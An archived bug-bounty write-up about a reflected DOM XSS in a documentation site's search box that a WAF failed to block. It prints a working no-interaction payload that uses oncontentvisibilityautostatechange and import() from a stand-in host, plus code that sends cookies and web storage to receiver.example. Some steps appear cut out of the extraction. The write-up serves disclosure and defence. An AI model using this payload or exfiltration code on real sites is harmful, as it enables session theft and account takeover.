# No Click, No Login

- **Source URL:** https://medium.com/@0xforgetmenot/no-click-no-login-a-reflected-dom-xss-in-a-documentation-search-box-c4471365af49
- **Fetched from:** https://web.archive.org/web/20261111075313/https://medium.com/@0xforgetmenot/no-click-no-login-a-reflected-dom-xss-in-a-documentation-search-box-c4471365af49
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14955 (id 14955)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# No Click, No Login: A Reflected DOM XSS in a Documentation Search Box

“*A static docs site, a search-index tokeniser and one obscure DOM event turned a single link into arbitrary JavaScript in the target’s own origin. Here is how I found it, and what it took to weaponise.”*

## TL;DR

- The documentation site is **unauthenticated**, and its front-end copies the `?q=` search parameter into the page.
- The search engine reports the query terms that matched **no** document, and the UI writes those terms into the page with `innerHTML` → **reflected DOM XSS**.
- Two obstacles had to be cleared: the **search index tokenises the query** (so a classic `<img onerror=…>` is shredded), and the **edge WAF blocklists known event-handler names** instead of the `on*` pattern, and does not filter `import()`.
- The key that unlocked it: `content-visibility:auto` + the standard-but-rare `oncontentvisibilityautostatechange` event → the handler **fires by itself**, with no click, no hover and no consent dialog.
- Result: **one link, no account, no interaction** → arbitrary JavaScript in an origin that also serves the product’s login and admin app.
- Reported with a **single-file PoC** (zero dependencies, gets its own TLS certificate) and verified end-to-end in a live browser.

## The Bug

Two halves make a DOM XSS. First, the parameter reaches the page:

```
// bundle.*.min.js — the search box is pre-filled from the URL
r.has("q") && (Ke("search",!0), e.value=r.get("q"), e.focus(), …)
```
Second, the search result list is built with `innerHTML`:

```
// every query term that matched NO document
o = Object.keys(e.terms).filter(f => !e.terms[f]).map(c => _("del",null,c))  // ← attacker controlled
```
`function ao(e,t){ if(typeof t=="string") e.innerHTML += t.toString(); … }    // ← sink`
The payload is not in the HTML the server sends — it is inserted by JavaScript after the page loads, from the `?q=` value the client read from the URL. That is what makes it *DOM-based* rather than reflected server-side.

## How I found it

Step 4 is worth the effort: it defines the *real* blast radius instead of the theoretical one.

At this point I had a reflection, not an XSS.

## Why the obvious payload does nothing

`?q=security <img src=x onerror=alert(1)>` returns **"No matching documents"** and injects nothing.

The search index is the reason. The framework’s search is built on **lunr**, and the query passes through its parser and tokenizer before it ever reaches the DOM:

The fix that satisfies all four at once: use `/` as the attribute separator, and write the dangerous characters as **HTML entities** — the *browser* decodes them when it parses the attribute value, the tokeniser never sees them.

```
<div/style='content-visibility:auto;contain-intrinsic-size:1px'
     /oncontentvisibilityautostatechange=import('https://receiver.example/x.js')>
```
A leading word that *does* match the index (`security`) is required — with no matching term there are no results, and the missing-terms block is never rendered.

## Get ForgetMeNot’s stories in your inbox

Join Medium for free to get updates from this writer.

I verified all of these rules offline against the shipped search worker before sending a single request to the live site.

## Getting JavaScript through the WAF

The site sits behind a managed WAF. Blocklists of *known* event-handler names have an obvious weakness: **anything valid that nobody has heard of still works.**

I mapped it differentially — every candidate requested repeatedly, so transient `403`s could be told apart from real rules, and only consistently-rejected strings counted as blocked.

Two entries in the “accepted” column do the work:

**oncontentvisibilityautostatechange=**`content-visibility: auto` tells the browser to skip rendering for off-screen content; when such an element becomes *relevant to the user* (it enters the viewport) the browser fires this event. The injected element sits **inside the visible search results**, so the event fires on its own.

**import(**`Access-Control-Allow-Origin: *` on the module, it loads cross-origin and executes **inside the target's origin**. Blocking `<script>` and `javascript:` does not help: a module script is a different loading mechanism entirely, and it was not on the list.

## THE Payload

```
?q=security <div/style='content-visibility:auto;contain-intrinsic-size:1px'
   /oncontentvisibilityautostatechange=import('https://receiver.example/x.js')></div>
```
URL-encoded, that is the entire attack: **one GET request, one link**.

## Impact

The injected module runs in the target origin and can read everything that origin exposes to JavaScript:

```
const data = {
  cookie:         document.cookie,
  localStorage:  JSON.stringify(localStorage),
  sessionStorage:JSON.stringify(sessionStorage),
  sameOrigin:    await fetch('/api/session/status', {credentials:'include'}).then(r => r.status)
};
await fetch('https://receiver.example/collect', {method:'POST', body: JSON.stringify(data)});
```
- **Session cookies** that are not `HttpOnly` are readable. In the affected product the identity-provider session cookie is *not* `HttpOnly` — the SPA reads it from `document.cookie` — so it is directly harvestable.
- **Web storage** holds more than preferences: here it carried the OIDC/PKCE transaction material of the admin client (`code_verifier`, `authority`, `client_id`, `scope`).
- **Same-origin API calls** with the victim’s cookies return real data (HTTP 200 with a non-empty body in my test).

## Takeaways

1. **A blocklist of event names is not a policy.** The HTML event set is large and keeps growing; match the *shape* (`on\w+`), not the names.
2. **import()**
 **needs its own rule.** Blocking `<script>` and `javascript:` while allowing module imports leaves the strongest primitive unguarded.
3. **CSS created new event triggers.** `content-visibility:auto` turns "hide this element" into "fire an event when it becomes visible". Filters that only know `onclick`/`onerror` are operating on a 2010 threat model.
4. **A tokeniser is part of your security model.** When input passes through a search index, its quirks — splitters, case folding, field separators, stemming — are what a reflected payload has to survive.
5. **Documentation sites are applications.** They run search indexes, workers and routers; review them like the product they document.
